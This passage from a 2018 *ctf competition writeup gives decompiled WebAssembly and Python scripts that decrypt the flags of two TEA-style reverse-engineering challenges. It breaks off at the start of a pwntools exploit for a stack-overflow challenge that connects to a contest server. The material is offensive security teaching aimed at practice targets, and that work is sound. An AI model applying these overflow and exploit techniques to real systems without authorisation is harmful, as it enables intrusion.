---
title: "*ctf writeups"
category: "rev"
subcategory: "wasm"
type: "writeup"
tags: ["rev", "wasm", "memcpy", "reverse-engineering", "ctf", "balsn"]
summary: "It's recommended to read our responsive web version of this writeup."
source:
  name: "balsn/ctf_writeup"
  url: "https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20180421-%2Actf/README.md"
ctf:
  name: "*ctf"
  year: 2018
---

## Source

- **CTF:** *ctf 2018
- **Repository:** [balsn/ctf_writeup](https://github.com/balsn/ctf_writeup)
- **File:** <https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20180421-%2Actf/README.md>

---
# *ctf 2018


**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20180421-*ctf/) of this writeup.**


 - [*ctf 2018](#ctf-2018)
   - [rev](#rev)
     - [wasm (sces60107)](#wasm-sces60107)
     - [milktea (sasdf)](#milktea-sasdf)
   - [pwn](#pwn)
     - [babystack (sces60107)](#babystack-sces60107)
     - [note (sces60107)](#note-sces60107)
     - [young_heap (4w4rd sces60107)](#young_heap-4w4rd-sces60107)
   - [web](#web)
     - [simpleweb (how2hack)](#simpleweb-how2hack)
   - [misc](#misc)
     - [welcome (bookgin)](#welcome-bookgin)
     - [warmup (sces60107)](#warmup-sces60107)
   - [ppc](#ppc)
     - [magic_number (b04902036)](#magic_number-b04902036)
     - [Chess Master (bookgin)](#chess-master-bookgin)
   - [crypto](#crypto)
     - [primitive (sasdf)](#primitive-sasdf)
     - [ssss (sasdf)](#ssss-sasdf)
     - [ssss2 (sasdf)](#ssss2-sasdf)



The official repository is [here](https://github.com/sixstars/starctf2018)

## rev

### wasm (sces60107)

I leverage [wasm2c](https://github.com/WebAssembly/wabt) to decomplie this wasm

Then I found some interesting function and data

```c=
static const u8 data_segment_data_0[] = {
  0x99, 0x00, 0x00, 0x00, 0x77, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
  0xbd, 0x00, 0x00, 0x00, 0x2f, 0x00, 0x00, 0x00, 0x6c, 0x00, 0x00, 0x00, 
  0x87, 0x00, 0x00, 0x00, 0x35, 0x00, 0x00, 0x00, 0x55, 0x00, 0x00, 0x00, 
  0x22, 0x00, 0x00, 0x00, 0x79, 0x00, 0x00, 0x00, 0x1d, 0x00, 0x00, 0x00, 
  0xf6, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 
  0x8c, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x00, 0x00, 0xd6, 0x00, 0x00, 0x00, 
  0x13, 0x00, 0x00, 0x00, 0x93, 0x00, 0x00, 0x00, 0xcb, 0x00, 0x00, 0x00, 
  0xd8, 0x00, 0x00, 0x00, 0x31, 0x00, 0x00, 0x00, 0xe3, 0x00, 0x00, 0x00, 
  0x77, 0x65, 0x62, 0x61, 0x73, 0x6d, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x73, 
  0x74, 0x69, 0x6e, 0x67, 
};

static void init_memory(void) {
  memcpy(&((*Z_envZ_memory).data[(*Z_envZ_memoryBaseZ_i)]), data_segment_data_0, 112);
}
static void init_table(void) {
  uint32_t offset;
  offset = (*Z_envZ_tableBaseZ_i);
  (*Z_envZ_table).data[offset + 0] = (wasm_rt_elem_t){func_types[6], (wasm_rt_anyfunc_t)(&f15)};
  (*Z_envZ_table).data[offset + 1] = (wasm_rt_elem_t){func_types[4], (wasm_rt_anyfunc_t)(&_EncryptCBC)};
  (*Z_envZ_table).data[offset + 2] = (wasm_rt_elem_t){func_types[1], (wasm_rt_anyfunc_t)(&_check)};
  (*Z_envZ_table).data[offset + 3] = (wasm_rt_elem_t){func_types[6], (wasm_rt_anyfunc_t)(&f15)};
}
static void _EncryptCBC(u32 p0, u32 p1, u32 p2, u32 p3) {
  u32 l0 = 0, l1 = 0, l2 = 0, l3 = 0, l4 = 0, l5 = 0, l6 = 0, l7 = 0, 
      l8 = 0, l9 = 0, l10 = 0, l11 = 0, l12 = 0, l13 = 0, l14 = 0, l15 = 0, 
      l16 = 0, l17 = 0, l18 = 0, l19 = 0, l20 = 0, l21 = 0, l22 = 0, l23 = 0, 
      l24 = 0, l25 = 0, l26 = 0, l27 = 0, l28 = 0, l29 = 0, l30 = 0, l31 = 0, 
      l32 = 0, l33 = 0, l34 = 0, l35 = 0, l36 = 0, l37 = 0, l38 = 0, l39 = 0, 
      l40 = 0, l41 = 0;
  FUNC_PROLOGUE;
  u32 i0, i1;
  i0 = g10;
  l41 = i0;
  i0 = g10;
  i1 = 48u;
  i0 += i1;
  g10 = i0;
  i0 = g10;
  i1 = g11;
  i0 = (u32)((s32)i0 >= (s32)i1);
  if (i0) {
    i0 = 48u;
    (*Z_envZ_abortStackOverflowZ_vi)(i0);
  }
  i0 = l41;
  i1 = 16u;
  i0 += i1;
  l38 = i0;
  i0 = l41;
  l39 = i0;
  i0 = p0;
  l30 = i0; l30=p0
  i0 = p1;
  l35 = i0; l35=p1
  i0 = p2;
  l36 = i0; l36=p2
  i0 = p3;
  l37 = i0; l37=p3
  i0 = l37; 
  l0 = i0;
  i0 = l0;
  i0 = f9(i0);  round key
  l1 = i0;
  i0 = l39;
  i1 = l1;
  i32_store(Z_envZ_memory, (u64)(i0), i1);
  i0 = l37;
  l2 = i0;
  i0 = l2;
  i1 = 4u;
  i0 += i1;
  l3 = i0;
  i0 = l3;
  i0 = f9(i0);
  l4 = i0;
  i0 = l39;
  i1 = 4u;
  i0 += i1;
  l5 = i0;
  i0 = l5;
  i1 = l4;
  i32_store(Z_envZ_memory, (u64)(i0), i1);
  i0 = l37;
  l6 = i0;
  i0 = l6;
  i1 = 8u;
  i0 += i1;
  l7 = i0;
  i0 = l7;
  i0 = f9(i0);
  l8 = i0;
  i0 = l39;
  i1 = 8u;
  i0 += i1;
  l9 = i0;
  i0 = l9;
  i1 = l8;
  i32_store(Z_envZ_memory, (u64)(i0), i1);
  i0 = l37;
  l10 = i0;
  i0 = l10;
  i1 = 12u;
  i0 += i1;
  l11 = i0;
  i0 = l11;
  i0 = f9(i0);
  l12 = i0;
  i0 = l39;
  i1 = 12u;
  i0 += i1;
  l13 = i0;
  i0 = l13;
  i1 = l12;
  i32_store(Z_envZ_memory, (u64)(i0), i1);
  L1: 
    i0 = l36;
    l14 = i0;
    i0 = l14;
    i1 = 8u;
    i0 = (u32)((s32)i0 >= (s32)i1);
    l15 = i0;
    i0 = l15;
    i0 = !(i0);
    if (i0) {
      goto B2;
    }
    i0 = l35;
    l16 = i0;
    i0 = l16;
    i0 = f9(i0);
    l17 = i0;
    i0 = l38;
    i1 = l17;
    i32_store(Z_envZ_memory, (u64)(i0), i1);
    i0 = l35;
    l18 = i0;
    i0 = l18;
    i1 = 4u;
    i0 += i1;
    l19 = i0;
    i0 = l19;
    i0 = f9(i0);
    l20 = i0;
    i0 = l38;
    i1 = 4u;
    i0 += i1;
    l21 = i0;
    i0 = l21;
    i1 = l20;
    i32_store(Z_envZ_memory, (u64)(i0), i1);
    i0 = l38;
    i1 = l39;
    f10(i0, i1);
    i0 = l30;
    l22 = i0;
    i0 = l38;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l23 = i0;
    i0 = l22;
    i1 = l23;
    f11(i0, i1);
    i0 = l30;
    l24 = i0;
    i0 = l24;
    i1 = 4u;
    i0 += i1;
    l25 = i0;
    i0 = l38;
    i1 = 4u;
    i0 += i1;
    l26 = i0;
    i0 = l26;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l27 = i0;
    i0 = l25;
    i1 = l27;
    f11(i0, i1);
    i0 = l35;
    l28 = i0;
    i0 = l28;
    i1 = 8u;
    i0 += i1;
    l29 = i0;
    i0 = l29;
    l35 = i0;
    i0 = l30;
    l31 = i0;
    i0 = l31;
    i1 = 8u;
    i0 += i1;
    l32 = i0;
    i0 = l32;
    l30 = i0;
    i0 = l36;
    l33 = i0;
    i0 = l33;
    i1 = 8u;
    i0 -= i1;
    l34 = i0;
    i0 = l34;
    l36 = i0;
    goto L1;
    B2:;
  i0 = l41;
  g10 = i0;
  goto Bfunc;
  Bfunc:;
  FUNC_EPILOGUE;
}

static u32 f9(u32 p0) {
  u32 l0 = 0, l1 = 0, l2 = 0, l3 = 0, l4 = 0, l5 = 0, l6 = 0, l7 = 0, 
      l8 = 0, l9 = 0, l10 = 0, l11 = 0, l12 = 0, l13 = 0, l14 = 0, l15 = 0, 
      l16 = 0, l17 = 0, l18 = 0, l19 = 0, l20 = 0, l21 = 0, l22 = 0, l23 = 0;
  FUNC_PROLOGUE;
  u32 i0, i1;
  i0 = g10;
  l23 = i0;
  i0 = g10;
  i1 = 16u;
  i0 += i1;
  g10 = i0;
  i0 = g10;
  i1 = g11;
  i0 = (u32)((s32)i0 >= (s32)i1);
  if (i0) {
    i0 = 16u;
    (*Z_envZ_abortStackOverflowZ_vi)(i0);
  }
  i0 = p0;
  l0 = i0;
  i0 = l0;
  l11 = i0;
  i0 = l11; l11=p0
  i0 = i32_load8_s(Z_envZ_memory, (u64)(i0));
  l15 = i0;
  i0 = l15;
  i1 = 255u;
  i0 &= i1;
  l16 = i0;
  i0 = l0;
  l17 = i0;
  i0 = l17;
  i1 = 1u;
  i0 += i1;
  l18 = i0;
  i0 = l18;
  i0 = i32_load8_s(Z_envZ_memory, (u64)(i0));
  l19 = i0;
  i0 = l19;
  i1 = 255u;
  i0 &= i1;
  l20 = i0;
  i0 = l20;
  i1 = 8u;
  i0 <<= (i1 & 31);
  l21 = i0;
  i0 = l16;
  i1 = l21;
  i0 |= i1;
  l1 = i0;
  i0 = l0;
  l2 = i0;
  i0 = l2;
  i1 = 2u;
  i0 += i1;
  l3 = i0;
  i0 = l3;
  i0 = i32_load8_s(Z_envZ_memory, (u64)(i0));
  l4 = i0;
  i0 = l4;
  i1 = 255u;
  i0 &= i1;
  l5 = i0;
  i0 = l5;
  i1 = 16u;
  i0 <<= (i1 & 31);
  l6 = i0;
  i0 = l1;
  i1 = l6;
  i0 |= i1;
  l7 = i0;
  i0 = l0;
  l8 = i0;
  i0 = l8;
  i1 = 3u;
  i0 += i1;
  l9 = i0;
  i0 = l9;
  i0 = i32_load8_s(Z_envZ_memory, (u64)(i0));
  l10 = i0;
  i0 = l10;
  i1 = 255u;
  i0 &= i1;
  l12 = i0;
  i0 = l12;
  i1 = 24u;
  i0 <<= (i1 & 31);
  l13 = i0;
  i0 = l7;
  i1 = l13;
  i0 |= i1;
  l14 = i0;
  i0 = l23;
  g10 = i0;
  i0 = l14;
  goto Bfunc;
  Bfunc:;
  FUNC_EPILOGUE;
  return i0;
}

static void f10(u32 p0, u32 p1) {
  u32 l0 = 0, l1 = 0, l2 = 0, l3 = 0, l4 = 0, l5 = 0, l6 = 0, l7 = 0, 
      l8 = 0, l9 = 0, l10 = 0, l11 = 0, l12 = 0, l13 = 0, l14 = 0, l15 = 0, 
      l16 = 0, l17 = 0, l18 = 0, l19 = 0, l20 = 0, l21 = 0, l22 = 0, l23 = 0, 
      l24 = 0, l25 = 0, l26 = 0, l27 = 0, l28 = 0, l29 = 0, l30 = 0, l31 = 0, 
      l32 = 0, l33 = 0, l34 = 0, l35 = 0, l36 = 0, l37 = 0, l38 = 0, l39 = 0, 
      l40 = 0, l41 = 0, l42 = 0, l43 = 0, l44 = 0, l45 = 0, l46 = 0, l47 = 0, 
      l48 = 0, l49 = 0, l50 = 0, l51 = 0, l52 = 0, l53 = 0, l54 = 0, l55 = 0, 
      l56 = 0, l57 = 0, l58 = 0, l59 = 0, l60 = 0, l61 = 0, l62 = 0;
  FUNC_PROLOGUE;
  u32 i0, i1;
  i0 = g10;
  l62 = i0;
  i0 = g10;
  i1 = 32u;
  i0 += i1;
  g10 = i0;
  i0 = g10;
  i1 = g11;
  i0 = (u32)((s32)i0 >= (s32)i1);
  if (i0) {
    i0 = 32u;
    (*Z_envZ_abortStackOverflowZ_vi)(i0);
  }
  i0 = p0;
  l10 = i0;
  i0 = p1;
  l21 = i0;
  i0 = 2654435769u;
  l32 = i0;
  i0 = 0u;
  l43 = i0;
  i0 = 0u;
  l54 = i0;
  L1: 
    i0 = l54;
    l58 = i0;
    i0 = l58;
    i1 = 32u;
    i0 = i0 < i1;
    l59 = i0;
    i0 = l59;
    i0 = !(i0);
    if (i0) {
      goto B2;
    }
    i0 = l32;
    l60 = i0;
    i0 = l43;
    l0 = i0;
    i0 = l0;
    i1 = l60;
    i0 += i1;
    l1 = i0;
    i0 = l1;
    l43 = i0;
    i0 = l10;
    l2 = i0;
    i0 = l2;
    i1 = 4u;
    i0 += i1;
    l3 = i0;
    i0 = l3;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l4 = i0;
    i0 = l4;
    i1 = 3u;
    i0 <<= (i1 & 31);
    l5 = i0;
    i0 = l21;
    l6 = i0;
    i0 = l6;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l7 = i0;
    i0 = l5;
    i1 = l7;
    i0 ^= i1;
    l8 = i0;
    i0 = l10;
    l9 = i0;
    i0 = l9;
    i1 = 4u;
    i0 += i1;
    l11 = i0;
    i0 = l11;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l12 = i0;
    i0 = l43;
    l13 = i0;
    i0 = l12;
    i1 = l13;
    i0 += i1;
    l14 = i0;
    i0 = l8;
    i1 = l14;
    i0 ^= i1;
    l15 = i0;
    i0 = l10;
    l16 = i0;
    i0 = l16;
    i1 = 4u;
    i0 += i1;
    l17 = i0;
    i0 = l17;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l18 = i0;
    i0 = l18;
    i1 = 5u;
    i0 >>= (i1 & 31);
    l19 = i0;
    i0 = l21;
    l20 = i0;
    i0 = l20;
    i1 = 4u;
    i0 += i1;
    l22 = i0;
    i0 = l22;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l23 = i0;
    i0 = l19;
    i1 = l23;
    i0 += i1;
    l24 = i0;
    i0 = l15;
    i1 = l24;
    i0 ^= i1;
    l25 = i0;
    i0 = l10;
    l26 = i0;
    i0 = l26;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l27 = i0;
    i0 = l27;
    i1 = l25;
    i0 += i1;
    l28 = i0;
    i0 = l26;
    i1 = l28;
    i32_store(Z_envZ_memory, (u64)(i0), i1);
    i0 = l10;
    l29 = i0;
    i0 = l29;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l30 = i0;
    i0 = l30;
    i1 = 3u;
    i0 <<= (i1 & 31);
    l31 = i0;
    i0 = l21;
    l33 = i0;
    i0 = l33;
    i1 = 8u;
    i0 += i1;
    l34 = i0;
    i0 = l34;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l35 = i0;
    i0 = l31;
    i1 = l35;
    i0 ^= i1;
    l36 = i0;
    i0 = l10;
    l37 = i0;
    i0 = l37;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l38 = i0;
    i0 = l43;
    l39 = i0;
    i0 = l38;
    i1 = l39;
    i0 += i1;
    l40 = i0;
    i0 = l36;
    i1 = l40;
    i0 ^= i1;
    l41 = i0;
    i0 = l10;
    l42 = i0;
    i0 = l42;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l44 = i0;
    i0 = l44;
    i1 = 5u;
    i0 >>= (i1 & 31);
    l45 = i0;
    i0 = l21;
    l46 = i0;
    i0 = l46;
    i1 = 12u;
    i0 += i1;
    l47 = i0;
    i0 = l47;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l48 = i0;
    i0 = l45;
    i1 = l48;
    i0 += i1;
    l49 = i0;
    i0 = l41;
    i1 = l49;
    i0 ^= i1;
    l50 = i0;
    i0 = l10;
    l51 = i0;
    i0 = l51;
    i1 = 4u;
    i0 += i1;
    l52 = i0;
    i0 = l52;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l53 = i0;
    i0 = l53;
    i1 = l50;
    i0 += i1;
    l55 = i0;
    i0 = l52;
    i1 = l55;
    i32_store(Z_envZ_memory, (u64)(i0), i1);
    i0 = l54;
    l56 = i0;
    i0 = l56;
    i1 = 1u;
    i0 += i1;
    l57 = i0;
    i0 = l57;
    l54 = i0;
    goto L1;
    B2:;
  i0 = l62;
  g10 = i0;
  goto Bfunc;
  Bfunc:;
  FUNC_EPILOGUE;
}

static void f11(u32 p0, u32 p1) {
  u32 l0 = 0, l1 = 0, l2 = 0, l3 = 0, l4 = 0, l5 = 0, l6 = 0, l7 = 0, 
      l8 = 0, l9 = 0, l10 = 0, l11 = 0, l12 = 0, l13 = 0, l14 = 0, l15 = 0, 
      l16 = 0, l17 = 0, l18 = 0, l19 = 0, l20 = 0, l21 = 0;
  FUNC_PROLOGUE;
  u32 i0, i1;
  i0 = g10;
  l21 = i0;
  i0 = g10;
  i1 = 16u;
  i0 += i1;
  g10 = i0;
  i0 = g10;
  i1 = g11;
  i0 = (u32)((s32)i0 >= (s32)i1);
  if (i0) {
    i0 = 16u;
    (*Z_envZ_abortStackOverflowZ_vi)(i0);
  }
  i0 = p0;
  l10 = i0;
  i0 = p1;
  l13 = i0;
  i0 = l13;
  l14 = i0;
  i0 = l14;
  i1 = 255u;
  i0 &= i1;
  l15 = i0;
  i0 = l10;
  l16 = i0;
  i0 = l16;
  i1 = l15;
  i32_store8(Z_envZ_memory, (u64)(i0), i1);
  i0 = l13;
  l17 = i0;
  i0 = l17;
  i1 = 8u;
  i0 >>= (i1 & 31);
  l18 = i0;
  i0 = l18;
  i1 = 255u;
  i0 &= i1;
  l19 = i0;
  i0 = l10;
  l0 = i0;
  i0 = l0;
  i1 = 1u;
  i0 += i1;
  l1 = i0;
  i0 = l1;
  i1 = l19;
  i32_store8(Z_envZ_memory, (u64)(i0), i1);
  i0 = l13;
  l2 = i0;
  i0 = l2;
  i1 = 16u;
  i0 >>= (i1 & 31);
  l3 = i0;
  i0 = l3;
  i1 = 255u;
  i0 &= i1;
  l4 = i0;
  i0 = l10;
  l5 = i0;
  i0 = l5;
  i1 = 2u;
  i0 += i1;
  l6 = i0;
  i0 = l6;
  i1 = l4;
  i32_store8(Z_envZ_memory, (u64)(i0), i1);
  i0 = l13;
  l7 = i0;
  i0 = l7;
  i1 = 24u;
  i0 >>= (i1 & 31);
  l8 = i0;
  i0 = l8;
  i1 = 255u;
  i0 &= i1;
  l9 = i0;
  i0 = l10;
  l11 = i0;
  i0 = l11;
  i1 = 3u;
  i0 += i1;
  l12 = i0;
  i0 = l12;
  i1 = l9;
  i32_store8(Z_envZ_memory, (u64)(i0), i1);
  i0 = l21;
  g10 = i0;
  goto Bfunc;
  Bfunc:;
  FUNC_EPILOGUE;
}

static u32 _check(u32 p0) {
  u32 l0 = 0, l1 = 0, l2 = 0, l3 = 0, l4 = 0, l5 = 0, l6 = 0, l7 = 0, 
      l8 = 0, l9 = 0, l10 = 0, l11 = 0, l12 = 0, l13 = 0, l14 = 0, l15 = 0, 
      l16 = 0, l17 = 0, l18 = 0, l19 = 0, l20 = 0, l21 = 0, l22 = 0, l23 = 0, 
      l24 = 0, l25 = 0, l26 = 0, l27 = 0, l28 = 0, l29 = 0, l30 = 0, l31 = 0, 
      l32 = 0, l33 = 0, l34 = 0, l35 = 0, l36 = 0, l37 = 0, l38 = 0;
  FUNC_PROLOGUE;
  u32 i0, i1, i2, i3;
  i0 = g10;
  l36 = i0;
  i0 = g10;
  i1 = 160u;
  i0 += i1;
  g10 = i0;
  i0 = g10;
  i1 = g11;
  i0 = (u32)((s32)i0 >= (s32)i1);
  if (i0) {
    i0 = 160u;
    (*Z_envZ_abortStackOverflowZ_vi)(i0);
  }
  i0 = l36;
  i1 = 144u;
  i0 += i1;
  l22 = i0;
  i0 = l36;
  i1 = 120u;
  i0 += i1;
  l28 = i0;
  i0 = l36;
  i1 = 8u;
  i0 += i1;
  l30 = i0;
  i0 = p0;
  l11 = i0;
  i0 = l11;
  l32 = i0;
  i0 = l32;
  i0 = (*Z_envZ__strlenZ_ii)(i0);
  l33 = i0;
  i0 = l33;
  i1 = 24u;
  i0 = i0 != i1;
  l1 = i0;
  i0 = l1;
  if (i0) {
    i0 = 0u;
    l0 = i0;
    i0 = l0;
    l27 = i0;
    i0 = l36;
    g10 = i0;
    i0 = l27;
    goto Bfunc;
  }
  i0 = l22;
  l34 = i0;
  i0 = (*Z_envZ_memoryBaseZ_i);
  i1 = 96u;
  i0 += i1;
  l37 = i0;
  i0 = l34; 144
  i1 = 16u;
  i0 += i1;
  l38 = i0;
  L2: 
    i0 = l34;
    i1 = l37;
    i1 = i32_load8_s(Z_envZ_memory, (u64)(i1));
    i32_store8(Z_envZ_memory, (u64)(i0), i1);
    i0 = l34;
    i1 = 1u;
    i0 += i1;
    l34 = i0;
    i0 = l37;
    i1 = 1u;
    i0 += i1;
    l37 = i0;
    i0 = l34;
    i1 = l38;
    i0 = (u32)((s32)i0 < (s32)i1);
    if (i0) {goto L2;}
  i0 = l11;
  l2 = i0;
  i0 = l28; 120
  i1 = l2;  plaintext
  i2 = 4u;  4
  i3 = l22; 144 key?
  _EncryptCBC(i0, i1, i2, i3);
  i0 = 0u;
  l29 = i0;
  i0 = l30;
  l34 = i0;
  i0 = (*Z_envZ_memoryBaseZ_i);
  i1 = 0u;
  i0 += i1;
  l37 = i0;
  i0 = l34;
  i1 = 96u;
  i0 += i1;
  l38 = i0;
  L3: 
    i0 = l34;
    i1 = l37;
    i1 = i32_load(Z_envZ_memory, (u64)(i1));
    i32_store(Z_envZ_memory, (u64)(i0), i1);
    i0 = l34;
    i1 = 4u;
    i0 += i1;
    l34 = i0;
    i0 = l37;
    i1 = 4u;
    i0 += i1;
    l37 = i0;
    i0 = l34;
    i1 = l38;
    i0 = (u32)((s32)i0 < (s32)i1);
    if (i0) {goto L3;}
  i0 = 0u;
  l29 = i0;
  L4: 
    i0 = l29;
    l3 = i0;
    i0 = l3;
    i1 = 3u;
    i0 = (u32)((s32)i0 < (s32)i1);
    l4 = i0;
    i0 = l4;
    i0 = !(i0);
    if (i0) {
      i0 = 11u;
      l35 = i0;
      goto B5;
    }
    i0 = 0u;
    l31 = i0;
    L7: 
      i0 = l31;
      l5 = i0;
      i0 = l5;
      i1 = 8u;
      i0 = (u32)((s32)i0 < (s32)i1);
      l6 = i0;
      i0 = l29;
      l7 = i0;
      i0 = l6;
      i0 = !(i0);
      if (i0) {
        goto B8;
      }
      i0 = l7;
      i1 = 3u;
      i0 <<= (i1 & 31);
      l8 = i0;
      i0 = l31;
      l9 = i0;
      i0 = l8;
      i1 = l9;
      i0 += i1;
      l10 = i0;
      i0 = l28;
      i1 = l10;
      i0 += i1;
      l12 = i0;
      i0 = l12;
      i0 = i32_load8_s(Z_envZ_memory, (u64)(i0));
      l13 = i0;
      i0 = l13;
      i1 = 255u;
      i0 &= i1;
      l14 = i0;
      i0 = l29;
      l15 = i0;
      i0 = l15;
      i1 = 3u;
      i0 <<= (i1 & 31);
      l16 = i0;
      i0 = l16;
      i1 = 7u;
      i0 += i1;
      l17 = i0;
      i0 = l31;
      l18 = i0;
      i0 = l17;
      i1 = l18;
      i0 -= i1;
      l19 = i0;
      i0 = l30; cipher
      i1 = l19;
      i2 = 2u;
      i1 <<= (i2 & 31);
      i0 += i1;
      l20 = i0;
      i0 = l20;
      i0 = i32_load(Z_envZ_memory, (u64)(i0));
      l21 = i0;
      i0 = l14;
      i1 = l21; cipher[pos]
      i0 = i0 != i1;
      l23 = i0;
      i0 = l23;
      if (i0) {
        i0 = 8u;
        l35 = i0;
        goto B5;
      }
      i0 = l31;
      l24 = i0;
      i0 = l24;
      i1 = 1u;
      i0 += i1;
      l25 = i0;
      i0 = l25;
      l31 = i0;
      goto L7;
      B8:;
    i0 = l7;
    i1 = 1u;
    i0 += i1;
    l26 = i0;
    i0 = l26;
    l29 = i0;
    goto L4;
    B5:;
  i0 = l35;
  i1 = 8u;
  i0 = i0 == i1;
  if (i0) {
    i0 = 0u;
    l0 = i0;
    i0 = l0;
    l27 = i0;
    i0 = l36;
    g10 = i0;
    i0 = l27;
    goto Bfunc;
  } else {
    i0 = l35;
    i1 = 11u;
    i0 = i0 == i1;
    if (i0) {
      i0 = 1u;
      l0 = i0;
      i0 = l0;
      l27 = i0;
      i0 = l36;
      g10 = i0;
      i0 = l27;
      goto Bfunc;
    }
  }
  i0 = 0u;
  goto Bfunc;
  Bfunc:;
  FUNC_EPILOGUE;
  return i0;
}
```
The first thing come out in my mind is that It's [TEA](https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm).

But there some difference. The encryption function in this challenge is
```c=
void encrypt (uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i < 32; i++) {                       /* basic cycle start */
        sum += delta;
        v0 += ((v1<<3) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        v1 += ((v0<<3) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
    }                                              /* end cycle */
    v[0]=v0; v[1]=v1;
}
```
Now it's easy to write a decryption script
```python=
from pwn import *
A=[0x99, 0x00, 0x00, 0x00, 0x77, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
  0xbd, 0x00, 0x00, 0x00, 0x2f, 0x00, 0x00, 0x00, 0x6c, 0x00, 0x00, 0x00, 
  0x87, 0x00, 0x00, 0x00, 0x35, 0x00, 0x00, 0x00, 0x55, 0x00, 0x00, 0x00, 
  0x22, 0x00, 0x00, 0x00, 0x79, 0x00, 0x00, 0x00, 0x1d, 0x00, 0x00, 0x00, 
  0xf6, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 
  0x8c, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x00, 0x00, 0xd6, 0x00, 0x00, 0x00, 
  0x13, 0x00, 0x00, 0x00, 0x93, 0x00, 0x00, 0x00, 0xcb, 0x00, 0x00, 0x00, 
  0xd8, 0x00, 0x00, 0x00, 0x31, 0x00, 0x00, 0x00, 0xe3, 0x00, 0x00, 0x00]
def decrypt(v,k):
  v0=v[0]
  v1=v[1]
  asum=0xC6EF3720
  delta=0x9e3779b9
  k0=k[0]
  k1=k[1]
  k2=k[2]
  k3=k[3]
  for i in range(32) :                      
    v1 -= ((v0<<3) ^ k2) ^ (v0 + asum) ^ ((v0>>5) + k3)
    v1 %=(2**32)
    v0 -= ((v1<<3) ^ k0) ^ (v1 + asum) ^ ((v1>>5) + k1)
    v0 %=(2**32)
    asum -= delta
    asum %= (2**32)
  return v0,v1

cipher=[A[i] for i in range(0,len(A),4)]
cipher="".join(map(chr,cipher))

key="webasmintersting"
k=[u32(key[i:i+4]) for i in range(0,len(key),4)]


flag=""
for i in range(3):
  vv=cipher[i*8:(i+1)*8][::-1]
  v=[u32(vv[i:i+4]) for i in range(0,len(vv),4)]
  a,b=decrypt(v,k)
  flag+=p32(a)+p32(b)
print flag
# *ctf{web4ss3mbly_1s_god}
```

### milktea (sasdf)

```python=
import struct

with open('milktea', 'rb') as f:
    data = f.read()
    keys = data[0x10C0:0x11A8]
    ct = data[0x1080:0x10B8]
keys = struct.unpack('<' + 'I' * (len(keys) // 4), keys)
keys = [keys[i:i+2] for i in range(0, len(keys), 2)]
ct = struct.unpack('<' + 'I' * (len(ct) // 4), ct)

# Fake memcmp
xx = [
    0x0BF7AC52, 0x801135AA, 0x5341B12E, 0x8C284278, 
    0x879413EE, 0xF0D4BB6A, 0x3336515C, 0x1498DC7D, 
    0x0BE8AD86, 0x310FE5B8, 0x3DEEAFD4, 0x5603371B, 
    0x00000000, 0x00000000,
]
ct = [c ^ x for c, x in zip(ct, xx)]
ct = [ct[i:i+2] for i in range(0, len(ct), 2)]

sbox = [
    0x206D2749, 0x69622061, 0x61662067, 0x666F206E, 
    0x70657320, 0x6D657974, 0x37633634, 0x66336265, 
    0x63383538, 0x66373331, 0x66646239, 0x65356166, 
    0x38386630, 0x39386530, 0x62623935, 0x35366532, 
]

mask = 0xffffffff


# Encyption sanity check
low, = struct.unpack('<I', 'aaaa')
high = low

for key in keys:
    high = ( ( (key[0] + sbox[low & 0xF]) ^ (low + ((low >> 5) ^ (low << 4))) ) + high ) & mask
    low = ( ( (key[1] + sbox[high & 0xF]) ^ (high + ((high >> 5) ^ (high << 4))) ) + low ) & mask
res = low << 32 | high

assert(res == 0xd5c62ef45e60fe03)

# Decrypt flag
plain = ''
for c in ct:
    high, low = c
    for key in reversed(keys):
        low = ( low - ( (key[1] + sbox[high & 0xF]) ^ (high + ((high >> 5) ^ (high << 4))) ) ) & mask
        high = ( high - ( (key[0] + sbox[low & 0xF]) ^ (low + ((low >> 5) ^ (low << 4))) ) ) & mask
    res = high << 32 | low
    plain += struct.pack('<Q', res)
print(repr(plain))
```

## pwn

### babystack (sces60107)

In this challenge, you can overflow the stack canary.
So you won't trigger `__stack_chk_fail`

```python=
from pwn import *
import hashlib
import itertools
import string
import os
import time
r=remote("47.91.226.78", 10005)
#env = {'LD_PRELOAD': os.path.join(os.getcwd(),'./libc.so.6-56d992a0342a67a887b8dcaae381d2cc51205253')}
#r=process("./bs",env=env)
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#gdb.attach(proc.pidof(r)[0],'b *'+hex(0x400a9b)+'\nc\n')

def proofwork():
  r.recvuntil('sha256(xxxx+')
  a=r.recvline()
  print a
  proof=a.split(" ")[-1]
  x=a.split(")")[0]
  proof=proof.strip()
  print r.recvuntil("xxxx:\n")
